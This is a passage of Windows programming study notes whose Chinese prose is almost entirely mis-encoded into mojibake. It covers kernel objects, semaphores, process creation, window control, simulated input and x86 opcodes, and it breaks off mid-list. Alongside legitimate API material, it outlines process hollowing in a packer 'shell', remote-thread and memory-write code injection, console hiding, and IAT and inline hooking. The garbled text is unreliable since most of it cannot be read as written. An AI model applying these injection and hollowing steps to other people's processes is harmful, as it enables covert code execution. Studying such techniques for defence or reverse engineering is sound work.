¸å¯¹è±¡ï¼Ÿ\nè¿›ç¨‹ã€çº¿ç¨‹ã€æ–‡ä»¶ã€æ–‡ä»¶æ˜ å°„ã€äº‹ä»¶ã€äº’æ–¥ä½“ç­‰ç­‰\näº‹ä»¶å†…æ ¸å¯¹è±¡çš„åˆ›å»º\nHANDLE g_hEvent = CreateEvent(NULL, TRUE, FALSE, \"XYZ\"); HANDLE g_hMutex = CreateMutex(NULL,FALSE, \"XYZ\"); äº‹ä»¶å†…æ ¸å¯¹è±¡çš„è·å–\nHANDLE OpenEvent( DWORD dwDesiredAccess, // access BOOL bInheritHandle, // inheritance option LPCTSTR lpName // object name ); HANDLE g_hEvent = OpenEvent(EVENT_ALL_ACCESS, FALSE, \"XYZ\"); HANDLE g_hMutex = OpenMutex(MUTEX_ALL_ACCESS,FALSE, \"XYZ\"); å†…æ ¸å¯¹è±¡çš„é”€æ¯\nBOOL CloseHandle(HANDLE hobj); å½“æ²¡æœ‰å…¶ä»–ç¨‹åºå¼•ç”¨æ—¶ï¼Œç³»ç»Ÿä¼šé”€æ¯å†…æ ¸å¯¹è±¡ï¼ˆä½¿ç”¨æ•°é‡ï¼‰ å†…æ ¸å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼Œå¯èƒ½æ¯”åˆ›å»ºå®ƒçš„å¯¹è±¡è¦é•¿ äº‹ä»¶\næ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸­å¯ä»¥è¢«ç¨‹åºç”¨æ¥è¿›è¡Œäº‹ä»¶é€šçŸ¥å’ŒåŒæ­¥çš„ â€œä¿¡å·ç¯â€ï¼ˆäº‹ä»¶å¯¹è±¡ï¼‰\nHANDLE CreateEvent( LPSECURITY_ATTRIBUTES lpEventAttributes, // å®‰å…¨å±æ€§ NULLæ—¶ä¸ºç³»ç»Ÿé»˜è®¤ BOOL bManualReset, // TRUE é€šè¿‡è°ƒç”¨ResetEventå°†äº‹ä»¶å¯¹è±¡æ ‡è®°ä¸ºæœªé€šçŸ¥ BOOL bInitialState, // TRUE å·²é€šçŸ¥çŠ¶æ€ FALSEæœªé€šçŸ¥çŠ¶æ€ LPCTSTR lpName // å¯¹è±¡åç§° ä»¥NULLç»“å°¾çš„å­—ç¬¦ä¸² ); äº‹ä»¶å¯¹è±¡çš„æ§åˆ¶\nBOOL SetEvent(HANDLE hEvent);\t//å°†å¯¹è±¡è®¾ç½®ä¸ºå·²é€šçŸ¥ å…³é—­æ—¶é—´å¯¹è±¡å¥æŸ„\nCloseHandle();\t//å…³é—­å¥æŸ„ ä¿¡å·é‡ åˆ›å»ºä¿¡å·é‡\nHANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, //è¡¨ç¤ºå®‰å…¨æ§åˆ¶ï¼Œä¸€èˆ¬ç›´æ¥ä¼ å…¥NULL LONG lInitialCount, //è¡¨ç¤ºåˆå§‹èµ„æºæ•°é‡ã€‚0æ—¶ä¸å‘é€ä¿¡å· LONG lMaximumCount, //è¡¨ç¤ºæœ€å¤§å¹¶å‘æ•°é‡ã€‚lInitialCount\u003c=lMaximumCount LPCTSTR lpName //è¡¨ç¤ºä¿¡å·é‡çš„åç§°ï¼Œä¼ å…¥NULLè¡¨ç¤ºåŒ¿åä¿¡å·é‡ ); æ‰“å¼€ä¿¡å·é‡\nHANDLE OpenSemaphore( DWORD dwDesiredAccess, //è¡¨ç¤ºè®¿é—®æƒé™ï¼Œå¯¹ä¸€èˆ¬ä¼ å…¥SEMAPHORE_ALL_ACCESS BOOL bInheritHandle, //ç¤ºä¿¡å·é‡å¥æŸ„ç»§æ‰¿æ€§ï¼Œä¸€èˆ¬ä¼ å…¥FALSEå³å¯ LPCTSTR lpName //è¡¨ç¤ºåç§°ï¼Œä¸åŒè¿›ç¨‹ä¸­çš„å„çº¿ç¨‹å¯ä»¥é€šè¿‡åç§°æ¥ç¡®ä¿å®ƒä»¬è®¿é—®åŒä¸€ä¸ªä¿¡å·é‡ ); é€’å¢ä¿¡å·é‡çš„å½“å‰èµ„æºè®¡æ•°\nBOOL ReleaseSemaphore( HANDLE hSemaphore, //ä¿¡å·é‡çš„å¥æŸ„ LONG lReleaseCount, //è¡¨ç¤ºå¢åŠ ä¸ªæ•°ï¼Œå¿…é¡»å¤§äº0ä¸”ä¸è¶…è¿‡æœ€å¤§èµ„æºæ•°é‡ LPLONG lpPreviousCount //è¿”å›å½“å‰èµ„æºæ•°é‡çš„åŸå§‹å€¼ï¼Œè®¾ä¸ºNULLè¡¨ç¤ºä¸éœ€è¦ä¼ å‡º ); //æ³¨ï¼šæ²¡æœ‰ä¸€ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥æŸ¥è¯¢ä¿¡æ ‡çš„å½“å‰èµ„æºæ•°é‡çš„å€¼ è¿›ç¨‹ å°±æ˜¯è¿è¡Œä¸­çš„ä¸€ä¸ªç¨‹åºï¼Œè¿›ç¨‹æä¾›ç¨‹åºæ‰€éœ€è¦çš„èµ„æºï¼Œå®ƒæä¾›æ•°æ®å’Œä»£ç ï¼Œæ˜¯ä¸€ç§ç©ºé—´çš„æ¦‚å¿µ\nè¿›ç¨‹å†…å­˜ç©ºé—´çš„åœ°å€åˆ’åˆ†ï¼š\nåˆ†åŒº x86 32ä½çš„windows ç©ºæŒ‡é’ˆèµ‹å€¼åŒº 0x00000000 - 0x0000FFFF ç”¨æˆ·æ¨¡å¼åŒº 0x00010000 - 0x7FFEFFFF 64KBç¦å…¥åŒº 0x7FFF0000 - 0x7FFFFFFF å†…æ ¸ 0x80000000 - 0xFFFFFFFF è¿›ç¨‹çš„åˆ›å»º\ngraph LR A[æ‰“å¼€ç³»ç»Ÿ] --\u003e B[åŒå‡»è¦è¿è¡Œçš„ç¨‹åº]; B --\u003e C[EXEå¼€å§‹æ‰§è¡Œ]; ä»»ä½•è¿›ç¨‹éƒ½æ˜¯åˆ«çš„è¿›ç¨‹åˆ›å»ºçš„ï¼šCreateProcess()\nè¿›ç¨‹çš„åˆ›å»ºè¿‡ç¨‹\nå½“ç³»ç»Ÿå¯åŠ¨åï¼Œåˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼šExplorer.exeä¹Ÿå°±æ˜¯æ¡Œé¢è¿›ç¨‹ å½“ç”¨æˆ·åŒå‡»æŸä¸€ä¸ªEXEæ—¶ï¼ŒExplorerè¿›ç¨‹ä½¿ç”¨CreateProcesså‡½æ•°åˆ›å»ºè¢«åŒå‡»çš„EXEï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨æ¡Œé¢ä¸ŠåŒå‡»åˆ›å»ºçš„è¿›ç¨‹éƒ½æ˜¯Explorerè¿›ç¨‹çš„å­è¿›ç¨‹ æ˜ å°„EXEæ–‡ä»¶ï¼ˆå°†exeæ”¾åˆ°å†…å­˜ä¸­ï¼‰ åˆ›å»ºå†…æ ¸å¯¹è±¡EPROCESS æ˜ å°„ç³»ç»ŸDLLï¼ˆntdll.dllï¼‰ åˆ›å»ºçº¿ç¨‹å†…æ ¸å¯¹è±¡ETHREAD ç³»ç»Ÿå¯åŠ¨çº¿ç¨‹ â€‹\tæ˜ å°„DLLï¼ˆntdll.LdrlnitializeThunkï¼‰\nâ€‹\tçº¿ç¨‹å¼€å§‹æ‰§è¡Œ\nCreateProcessçš„åšäº†ä»€ä¹ˆï¼š\nBOOL CreateProcess( LPCSTR lpApplicationName,\t//å¯¹è±¡åç§° LPSTR lpCommandLine,\t//å‘½ä»¤è¡Œ LPSECURITY_ATTRIBUTES lpProcessAttributes,\t//ä¸ç»§æ‰¿è¿›ç¨‹å¥æŸ„ LPSECURITY_ATTRIBUTES lpThreadAttributes,\t//ä¸ç»§æ‰¿çº¿ç¨‹å¥æŸ„ BOOL bInheritHandles,\t//æ˜¯å¦å…è®¸ç»§æ‰¿çˆ¶è¿›ç¨‹å¯ç»§æ‰¿çš„å¯¹è±¡ DWORD dwCreationFlags,\t//æ²¡æœ‰åˆ›å»ºæ ‡å¿— LPVOID lpEnvironment,\t//ä½¿ç”¨çˆ¶è¿›ç¨‹ç¯å¢ƒå˜é‡ LPCSTR lpCurrentDirectory,\t//ä½¿ç”¨çˆ¶è¿›ç¨‹è‡ªå½•ä½œä¸ºå½“å‰ç›®å½•ï¼Œå¯ä»¥è‡ªå·±è®¾ç½®ç›®å½• LPSTARTUPINFOA lpStartupInfo,\t//STARTUPINFOWç»“æ„ä½“è¯¦ç»†ä¿¡æ¯ LPPROCESS_INFORMATION lpProcessInformation\t//PROCESS_INFORMATIONç»“æ„ä½“è¿›ç¨‹ä¿¡æ¯ )\tåˆ›å»ºå†…æ ¸å¯¹è±¡\nåˆ†é…4GBçš„è™šæ‹Ÿç©ºé—´ï¼ˆWindows 32ä½ï¼‰\nå°†EXEæ‹‰ä¼¸ï¼Œå­˜å‚¨åˆ°æŒ‡å®šçš„ä½ç½® éå†EXEå¯¼å…¥è¡¨ï¼Œå°†éœ€è¦ç”¨åˆ°çš„DLLæ‹‰ä¼¸å­˜å‚¨åˆ°æŒ‡å®šä½ç½®ï¼Œå¦‚æœä½ç½®è¢«å ç”¨ï¼Œæ¢çš„åœ°æ–¹ï¼Œå¹¶é€šè¿‡DLLçš„é‡å®šä½è¡¨ï¼Œä¿®å¤å…¨å±€éå† DLLå¦‚æœå¼•ç”¨äº†å…¶ä»–çš„DLLï¼Œåˆ™é€’å½’ç¬¬äºŒæ­¥ ä¿®å¤EXE/DLLä¸­çš„IATè¡¨ åˆ›å»ºçº¿ç¨‹ã€è®¾ç½®çº¿ç¨‹CONTEXTå¼€å§‹æ‰§è¡Œ åˆ›å»ºè¿›ç¨‹çš„ä¸»çº¿ç¨‹\nå½“è¿›ç¨‹çš„ç©ºé—´åˆ›å»ºå®Œæ¯•ï¼ŒEXEä¸å¯¼å…¥è¡¨ä¸­çš„DLLéƒ½æ­£ç¡®åŠ è½½å®Œæ¯•åï¼Œä¼šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚\nå½“çº¿ç¨‹å¾—åˆ°CPUçš„æ—¶å€™ï¼Œç¨‹åºå°±æ­£å¼€å§‹æŒ‡å‘äº†ï¼ŒEIPçš„åˆå§‹å€¼è®¾å®šä¸ºï¼šImageBase+OEP\nHANDLE CreateThread( PSECURITY_ATTRIBUTES psa, DWORD cbStack, PTHREAD_START_ROUTINE pfnStartAddr, PVOID pvParam, DWORD fdwCreate, PDWORD pdwThreadID); å½“è¿›ç¨‹åˆ›å»ºæˆåŠŸåï¼Œä¼šå°†è¿›ç¨‹å¥æŸ„ã€ä¸»çº¿ç¨‹å¥æŸ„ã€è¿›ç¨‹IDä»¥åŠä¸»çº¿ç¨‹IDå­˜å‚¨åœ¨ï¼š\ntypedef struct _PROCESS_INFORMATION { HANDLE hProcess;\t//è¿›ç¨‹å¥æŸ„ HANDLE hThread;\t//ä¸»çº¿ç¨‹å¥æŸ„ DWORD dwProcessId;\t//è¿›ç¨‹ID DWORD dwThreadId;\t//çº¿ç¨‹ID } PROCESS_INFORMATION; ä¹Ÿå°±æ˜¯ï¼ŒCreateProcessçš„æœ€åä¸€ä¸ªOUTå‚æ•°ã€‚\nç»ˆæ­¢è¿›ç¨‹çš„ä¸‰ç§æ–¹å¼ï¼š\n/*1ã€*/VOIDã€€ExitProcess(UINT fuExitCode)\t//è¿›ç¨‹è‡ªå·±è°ƒç”¨\t/*2ã€*/BOOL TerminateProcess(HANDLE hProcess, UINT fuExitCode);\t//ç»ˆæ­¢å…¶ä»–è¿›ç¨‹ /*3ã€*/ExitThread\t//ç»ˆæ­¢è¿›ç¨‹ä¸­çš„æ‰€æœ‰çº¿ç¨‹ï¼Œè¿›ç¨‹ä¹Ÿä¼šç»ˆæ­¢ è·å–è¿›ç¨‹çš„é€€å‡ºç ï¼š\nBOOL GetExitCodeProcess(HANDLE hProcess,PDWORD pdwExitCode); è¿›ç¨‹ç»ˆæ­¢æ—¶ç›¸å…³æ“ä½œï¼š\nè¿›ç¨‹ä¸­å‰©ä½™çš„æ‰€æœ‰çº¿ç¨‹å…¨éƒ¨ç»ˆæ­¢è¿è¡Œ è¿›ç¨‹æŒ‡å®šçš„æ‰€æœ‰ç”¨æˆ·å¯¹è±¡å‡è¢«é‡Šæ”¾ï¼Œæ‰€æœ‰å†…æ ¸å¯¹è±¡å‡è¢«å…³é—­ è¿›ç¨‹å†…æ ¸å¯¹è±¡çš„çŠ¶æ€å˜æˆæ”¶åˆ°é€šçŸ¥çš„çŠ¶æ€ è¿›ç¨‹å†…æ ¸å¯¹è±¡çš„ä½¿ç”¨è®¡æ•°é€’å‡1 å¥æŸ„è¡¨ ä»€ä¹ˆæ˜¯å†…æ ¸å¯¹è±¡ï¼š\nåƒè¿›ç¨‹ã€çº¿ç¨‹ã€æ–‡ä»¶ã€äº’æ–¥ä½“ã€äº‹ä»¶ç­‰åœ¨å†…æ ¸éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç»“æ„ä½“ï¼Œè¿™äº›ç»“æ„ä½“ç”±å†…æ ¸è´Ÿè´£ç®¡ç†ã€‚æˆ‘ä»¬ç®¡è¿™æ ·çš„å¯¹è±¡å«åšå†…æ ¸å¯¹è±¡ã€‚\nä¸€ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªè‡ªå·±çš„å†…æ ¸å¯¹è±¡ï¼ˆEPROCESSï¼‰ï¼Œåœ¨è¿™ä¸€ä¸ªè¿›ç¨‹é‡Œé¢è¿˜æœ‰å¯èƒ½åˆ›å»ºå…¶ä»–çš„å†…æ ¸å¯¹è±¡ï¼ˆç´«è‰²çš„ï¼‰ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨ä»–ä»¬å‘¢ï¼Ÿå¯ä»¥å°†å¯¹åº”çš„å†…æ ¸å¯¹è±¡çš„åœ°å€ä¼ å›å»å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åœ¨ç”¨æˆ·å±‚è®¿é—®å†…æ ¸å±‚çš„é—®é¢˜åœ¨äºï¼Œå¦‚æœè¿™ä¸ªå†…æ ¸å¯¹è±¡çš„åœ°å€è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆè®¿é—®å¯¹åº”å†…æ ¸å±‚çš„åœ°å€æ—¶å°±ä¼šå†…å­˜æ— æ³•è®¿é—®ã€‚æ‰€ä»¥å°±äº§ç”Ÿäº†å¥æŸ„è¡¨ï¼Œå¥æŸ„è¡¨æ˜¯0ç¯EPROCESSä¸‹çš„ä¸€ä¸ªæˆå‘˜ï¼ˆè“è‰²çš„ï¼‰ï¼Œå¥æŸ„è¡¨å­˜åœ¨çš„ç›®çš„å°±æ˜¯è§£å†³ä¸Šé¢çš„é—®é¢˜ã€‚åœ¨å¥æŸ„è¡¨é‡Œé¢ä¼šå­˜å‚¨è¿›ç¨‹é‡Œé¢æ‰€æœ‰å†…æ ¸å¯¹è±¡çš„åœ°å€ï¼ˆ0ç¯ï¼‰ï¼Œæ‰€ä»¥å°†ç¼–å·ä¼ å›å»ï¼Œä½¿ç”¨å¯¹åº”çš„å†…æ ¸å¯¹è±¡æ—¶ç”¨ç¼–å·æ¥ä»£æ›¿å¯¹åº”0ç¯çš„åœ°å€ã€‚ï¼ˆç›¸å½“äºé˜²ç«å¢™çš„å­˜åœ¨ï¼Œç”¨æˆ·å±‚æ²¡åŠæ³•ç›´æ¥æ“ä½œå†…æ ¸å±‚ï¼‰\næ³¨æ„ï¼š\nå¤šä¸ªè¿›ç¨‹å¯ä»¥å…±äº«ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œä½†æ˜¯ç´¢å¼•å€¼å¯èƒ½ä¸å¤ªä¸€æ ·ã€‚ æœ‰å‡ ä¸ªè¿›ç¨‹æ‰“å¼€æˆ–ä½¿ç”¨äº†è¿™ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå†…æ ¸å¯¹è±¡ä¸­çš„è®¡æ•°å™¨å°±ä¼šå˜ä¸ºå‡ ï¼ˆç´«è‰²é‡Œé¢çš„çº¢è‰²å°ä¸‹æ ‡ï¼‰ã€‚ closehandleçš„apiæ˜¯è®©å†…æ ¸å¯¹è±¡ä¸­çš„è®¡æ•°å™¨çš„å€¼å‡ä¸€ã€‚ å¦‚æœæƒ³è¦å…³é—­çº¿ç¨‹çš„å†…æ ¸å¯¹è±¡ï¼Œè¦ä½¿è®¡æ•°å™¨çš„å€¼ä¸º0ä¸”éœ€è¦å…³é—­è¿™ä¸ªçº¿ç¨‹ï¼Œä¸¤ä¸ªæ¡ä»¶ç¼ºä¸€ä¸å¯ã€‚é™¤äº†çº¿ç¨‹ä»¥å¤–çš„å†…æ ¸å¯¹è±¡åªéœ€è¦ä½¿è®¡æ•°å™¨çš„å€¼ä¸º0å°±å¯ä»¥å…³é—­è¿™ä¸ªå†…æ ¸å¯¹è±¡ã€‚ï¼ˆåˆ›å»ºå¯¹è±¡è®¡æ•°å™¨åŠ ä¸€ï¼Œæ‰“å¼€å¯¹è±¡åŠ ä¸€ï¼Œå…³é—­å¯¹è±¡å‡ä¸€ï¼‰ å…³äºå¥æŸ„å’ŒIDï¼š\néƒ½æ˜¯ç³»ç»Ÿåˆ†é…çš„ä¸€ä¸ªç¼–å·ï¼Œå¥æŸ„æ˜¯å®¢æˆ·ç¨‹åºä½¿ç”¨IDä¸»è¦æ˜¯ç³»ç»Ÿè°ƒåº¦æ—¶ä½¿ç”¨ã€‚ è°ƒç”¨CloseHandleå…³é—­è¿›ç¨‹æˆ–è€…çº¿ç¨‹å¥æŸ„çš„æ—¶å€™ï¼Œåªæ˜¯è®©å†…æ ¸è®¡æ•°å™¨å‡å°‘ä¸€ä¸ªï¼Œå¹¶ä¸æ˜¯ç»ˆæ­¢è¿›ç¨‹æˆ–è€…çº¿ç¨‹ã€‚è¿›ç¨‹æˆ–çº¿ç¨‹å°†ç»§ç»­è¿è¡Œï¼Œç›´åˆ°å®ƒè‡ªå·±ç»ˆæ­¢è¿è¡Œã€‚ è¿›ç¨‹IDä¸çº¿ç¨‹IDæ˜¯ä¸å¯èƒ½ç›¸åŒã€‚ä½†ä¸è¦é€šè¿‡è¿›ç¨‹æˆ–è€…çº¿ç¨‹çš„IDæ¥æ“ä½œè¿›ç¨‹æˆ–è€…çº¿ç¨‹ï¼Œå› ä¸ºï¼Œè¿™ä¸ªç¼–å·æ˜¯ä¼šé‡å¤ä½¿ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä½ é€šè¿‡ID=100è¿™ä¸ªç¼–å·å»è®¿é—®ä¸€ä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œå®ƒå·²ç»ç»“æŸäº†ï¼Œè€Œä¸”ç³»ç»Ÿå°†è¿™ä¸ªç¼–å·èµ‹ç»™äº†å¦å¤–ä¸€ä¸ªè¿›ç¨‹æˆ–è€…çº¿ç¨‹ã€‚ åŠ å¯†å£³ æ­¥éª¤ï¼š è¯»å–ä¸»æ¨¡å—çš„æ•°æ®\nè§£å¯†ï¼šå¾—åˆ°åŸæ¥çš„PEæ–‡ä»¶\nä»¥æŒ‚èµ·çš„å½¢å¼åˆ›å»ºè¿›ç¨‹ï¼šCreateProcessï¼Œè¦åˆ›å»ºçš„è¿›ç¨‹ï¼Œå°±æ˜¯å£³å­æœ¬èº«ï¼\nè·å–å¤–å£³ç¨‹åºçš„Contextï¼Œåé¢è¦ç”¨\nå¸è½½å¤–å£³ç¨‹åº\nåœ¨æŒ‡å®šçš„ä½ç½®åˆ†é…ç©ºé—´ï¼šä½ç½®å°±æ˜¯srcçš„ImageBase å¤§å°å°±æ˜¯Srcçš„SizeOfImage\nå¦‚æœæˆåŠŸï¼Œå°†Srcçš„PEæ–‡ä»¶æ‹‰ä¼¸ï¼Œå¤åˆ¶åˆ°è¯¥ç©ºé—´ä¸­ï¼›å¦‚æœç”³è¯·ç©ºé—´å¤±è´¥ï¼Œä½†æœ‰é‡å®šä½è¡¨ï¼šåœ¨ä»»æ„ä½ç½®ç”³è¯·ç©ºé—´ï¼Œç„¶åå°†PEæ–‡ä»¶æ‹‰ä¼¸ã€å¤åˆ¶ã€ä¿®å¤é‡å®šä½è¡¨\nå¦‚æœç¬¬6æ­¥ç”³è¯·ç©ºé—´å¤±è´¥ï¼Œå¹¶ä¸”è¿˜æ²¡æœ‰é‡å®šä½è¡¨ï¼Œç›´æ¥è¿”å›ï¼šå¤±è´¥\nä¿®æ”¹å¤–å£³ç¨‹åºçš„Contextï¼š\nå°†Contextçš„ImageBaseæ”¹æˆSrcçš„ImageBase\nå°†Contextçš„OPEæ”¹æˆSrcçš„OEP\nè®¾ç½®Contextå¹¶æ¢å¤ä¸»çº¿ç¨‹\nç»ˆæ­¢å¤–å£³ç¨‹åºï¼Œè§£å£³è¿‡ç¨‹ç»“æŸ\né¼ æ ‡_çª—å£ æŸ¥æ‰¾æŒ‡å®šçª—å£\nHWND hwnd = ::FindWindow(NULL,TEXT(\"ä»»åŠ¡ç®¡ç†å™¨\")); çª—å£æ§åˆ¶\n//åˆ‡æ¢çª—å£ SwitchToThisWindow(hwnd,false); //å…³é—­çª—å£ ::SendMessage(hwnd,WM_CLOSE,0,0); æŸ¥æ‰¾å­çª—å£\nHWND hEdit = FindWindowEx(hwnd,NULL,\"Edit\",\"\"); HWND hEdit =::GetDlgItem(hwnd,0x3E9); éšè—æ§åˆ¶å°\n//vsä¸­ #pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\" ) //mingwä¸­ ShowWindow(GetConsoleWindow(), SW_HIDE); æ¨¡æ‹Ÿé¼ æ ‡å•å‡»\n::GetWindowRect(hButton,\u0026r); //è®¾ç½®é¼ æ ‡çš„ä½ç½® ::SetCursorPos(r.left+10,r.top+10); //é¼ æ ‡å·¦é”®å•å‡» mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);//ç‚¹ä¸‹å·¦é”® mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);//æ¾å¼€å·¦é”® æ¨¡æ‹Ÿé”®ç›˜ç‚¹å‡»\nkeybd_event(97,0,0,0); keybd_event(97,0,KEYEVENTF_KEYUP,0); Sleep(1000); keybd_event(66,0,0,0); keybd_event(66,0,KEYEVENTF_KEYUP,0); Sleep(1000); keybd_event(16,0,0,0); keybd_event(67,0,0,0); keybd_event(67,0,KEYEVENTF_KEYUP,0); keybd_event(16,0,KEYEVENTF_KEYUP,0); é”®ç›˜é”®ä¸è™šæ‹Ÿé”®ç å¯¹ç…§è¡¨\nè¿œç¨‹çº¿ç¨‹æ³¨å…¥ å°†è‡ªå·±çš„æ¨¡å—æ”¾åˆ°åˆ«äººçš„è¿›ç¨‹ä¸­ã€‚\nå¦‚æœæƒ³åœ¨è¿›ç¨‹ï¼ˆå¾…æ³¨å…¥ï¼‰ä¸­æ‰§è¡Œä»£ç ï¼Œè¯¥å¦‚ä½•å®ç°å‘¢ï¼Ÿ\nåˆ›å»ºçº¿ç¨‹ï¼š\nHANDLE WINAPI CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, PDWORD lpThreadId ); åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼š\nHANDLE WINAPI CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ—¶ï¼Œéœ€è¦æŒ‡å®šè¿›ç¨‹ID/çº¿ç¨‹å‡½æ•°/çº¿ç¨‹å‡½æ•°çš„å‚æ•°\nPIDçš„è·å– çº¿ç¨‹å‡½æ•°çš„åœ°å€ ç­‰å¾…çº¿ç¨‹å‡½æ•°ç»“æŸï¼Œ è·å–çº¿ç¨‹é€€å‡ºç ï¼Œå³LoadLibraryçš„è¿”å›å€¼ï¼Œå³dllçš„é¦–åœ°å€\né‡Šæ”¾ä¸ºDLLåå­—ç”³è¯·çš„ç©ºé—´\nå…³é—­å¥æŸ„\nå¦‚ä½•å¯åŠ¨æˆ‘ä»¬æƒ³åœ¨è¿›ç¨‹ä¸­æ‰§è¡Œçš„ä»£ç ï¼Ÿ\nå†…å­˜å†™å…¥ æ­¥éª¤ï¼š\nè·å–è‡ªèº«å¥æŸ„ å¾—åˆ°ImageSizeçš„å¤§å°ï¼Œå¾—åˆ°æ¨¡å—çš„ImageBuffer åœ¨å½“å‰ç©ºé—´ç”³è¯·ç©ºé—´å­˜æ”¾è‡ªèº«ä»£ç  æ‹·è´è‡ªèº«åˆ°ç¼“å­˜ æ‰“å¼€è¦æ³¨å…¥çš„è¿›ç¨‹ åœ¨è¿œç¨‹è¿›ç¨‹ç”³è¯·ç©ºé—´ å¯¹æ¨¡å—ä¸­çš„ä»£ç è¿›è¡Œé‡å®šä½ å¾—åˆ°æ¨¡å—ä¸­è¦è¿è¡Œçš„å‡½æ•°çš„åœ°å€ å°†æ¨¡å—åœ¨è¿›ç¨‹ä¸­çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¥å£å‡½æ•° å°†ä¿®æ­£åçš„æ¨¡å—ï¼Œé€šè¿‡WriteProcessMemoryå†™å…¥è¿œç¨‹è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ é€šè¿‡CreateRemoteThreadå¯åŠ¨åˆšå†™å…¥çš„ä»£ç  é‡Šæ”¾å†…å­˜ æ¨¡å—å…¥å£å‡½æ•°æ‰§è¡Œï¼š\næ ¹æ®é‡å®šä½ä¿¡æ¯ï¼Œä¿®å¤IATè¡¨ æ‰§è¡Œå…¶ä»–åŠŸèƒ½ é€šè¿‡å…¨å±€å˜é‡æ¥ç»“æŸè¿™ä¸ªå‡½æ•° æ€è·¯ï¼š\nè·å–è‡ªèº«å¥æŸ„ å¾—åˆ°è‡ªå·±çš„ImageBase/SizeOfImage åˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²åŒºï¼Œå°†è‡ªå·±å¤åˆ¶è¿›å» æ‰“å¼€è¦æ³¨å…¥çš„è¿›ç¨‹ åœ¨è¦æ³¨å…¥çš„è¿›ç¨‹ä¸­ç”³è¯·å†…å­˜ï¼Œå¤§å°å°±æ˜¯SizeOfImage ä¿®å¤è‡ªå·±è¿›ç¨‹çš„é‡å®šä½è¡¨ å°†ä¿®å¤åçš„æ•°æ®ï¼Œå¤åˆ¶åˆ°è¦æ³¨å…¥çš„å†…å­˜ä¸­ åˆ›å»ºä¸€ä¸ªè¿œç¨‹çº¿ç¨‹ï¼Œæ‰§è¡ŒEntry IAT Hook ä¹‹å‰åœ¨PEç»“æ„ä¸­çš„IATè¡¨ï¼ˆcallåé¢çš„åœ°å€ï¼‰ï¼Œå°±æ˜¯ä¿®æ”¹IATè¡¨é‡Œé¢çš„å€¼å®ç°Hook\nInline Hook å…¶å®å°±æ˜¯å°†æ­£å¸¸çš„ç¨‹åºé‡Œé¢ä¿®æ”¹5å­—èŠ‚æ”¹ä¸ºJmp addrï¼Œæ‰§è¡Œä¹‹åå†è·³å›æ¥ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ï¼š\nç»†èŠ‚ï¼š åœ¨Jmpåˆ°è‡ªå·±çš„ä»£ç åè¦å…ˆä¿å­˜æ‰€æœ‰çš„å¯„å­˜å™¨çš„å€¼ï¼ˆpushad pushfdï¼‰ï¼Œåœ¨æ‰§è¡Œå®Œæˆè‡ªå·±çš„ä»£ç åéœ€è¦æ¢å¤æ‰€æœ‰çš„å¯„å­˜å™¨ï¼ˆpopad popfdï¼‰ åœ¨æ¢å¤æ‰€æœ‰çš„å¯„å­˜å™¨ä¹‹åéœ€è¦æ‰§è¡Œä¿®æ”¹çš„é‚£5å­—èŠ‚çš„æŒ‡ä»¤ï¼Œè·³è½¬å›å»åˆ™æ˜¯è·³è½¬åˆ°ä¿®æ”¹5å­—èŠ‚æŒ‡ä»¤çš„ä¸‹ä¸€è¡ŒæŒ‡ä»¤çš„ä½ç½® ç¡¬ç¼–ç  ç»å…¸å®šé•¿æŒ‡ä»¤ï¼ˆä¿®æ”¹å¯„å­˜å™¨ï¼‰ æ±‡ç¼–è¯­è¨€æ ¼å¼ï¼š\næ¯ä¸€æ¡æŒ‡ä»¤ï¼Œæœ€çŸ­1å­—èŠ‚ï¼Œæœ€é•¿15å­—èŠ‚\nèƒŒè¯µï¼š\né¹Œé¹‘è›‹åˆ«ç”Ÿç—…ï¼Œä¸Šå¸ å››é›¶åŠ å‡ä¸€ï¼Œäº”é›¶å…¥å‡ºæ ˆï¼Œä¹é›¶ä¿ºäº¤æ¢ bé›¶ç§»åŠ¨åå…­ä¸ä¸‰äºŒ ç»å…¸å®šé•¿æŒ‡ä»¤ä¸‹(ä¿®æ”¹EIP) æ¡ä»¶è·³è½¬ï¼Œåè·Ÿä¸€ä¸ªå­—èŠ‚ç«‹å³æ•°çš„åç§»ï¼ˆæœ‰ç¬¦å·ï¼‰ï¼Œå…±ä¸¤ä¸ªå­—èŠ‚ã€‚\nå¦‚æœæ¡ä»¶æˆç«‹ï¼Œè·³è½¬åˆ°ï¼šå½“å‰æŒ‡ä»¤åœ°å€ + å½“å‰æŒ‡ä»¤é•¿åº¦ + Ib\næœ€å¤§å€¼ï¼šå‘å‰è·³7fï¼Œå‘åè·³80\n0x70 JO 0x71\tJNO 0x72\tJB/JNAE/JC 0x73\tJNB/JAE/JNC 0x74\tJZ/JE 0x75\tJNZ/JNE 0x76\tJBE/JNA 0x77\tJNBE/JA 